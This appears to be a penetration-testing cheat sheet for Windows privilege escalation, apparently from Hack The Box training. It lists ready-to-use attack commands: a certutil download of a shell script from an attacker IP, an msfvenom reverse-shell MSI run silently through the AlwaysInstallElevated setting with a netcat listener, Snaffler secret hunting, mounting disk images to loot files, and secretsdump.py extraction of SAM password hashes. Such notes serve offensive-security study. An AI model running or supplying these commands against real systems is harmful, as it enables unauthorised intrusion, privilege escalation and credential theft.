# Living Off The Land Binaries and Scripts (LOLBAS)
```powershell
https://lolbas-project.github.io/
```

# Transferring File with Certutil
```powershell
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Encoding File with Certutil
certutil -encode file1 encodedfile

# Decoding File with Certutil
certutil -decode encodedfile file2
```

# Always Install Elevated
```powershell
Computer Configuration\Administrative Templates\Windows Components\Windows Installer
User Configuration\Administrative Templates\Windows Components\Windows Installer

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

# Generating MSI Package
```powershell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Executing MSI Package
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

# Catching Shell
nc -lnvp 9443
```

# Scheduled Tasks
```powershell
C:\Windows\System32\Tasks

schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
```

# Checking Permissions Directory
```powershell
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

# User/Computer Description Field
```powershell
Get-LocalUser

Get-WmiObject -Class Win32_OperatingSystem | select Description
```

# Mount VHDX/VMDK
```powershell
Snaffler.exe -d domain.local -s -v info -o snaffler_results.txt

guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

File --> Map Virtual Disks
```

# Retrieving Hashes using Secretsdump.py
```powershell
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
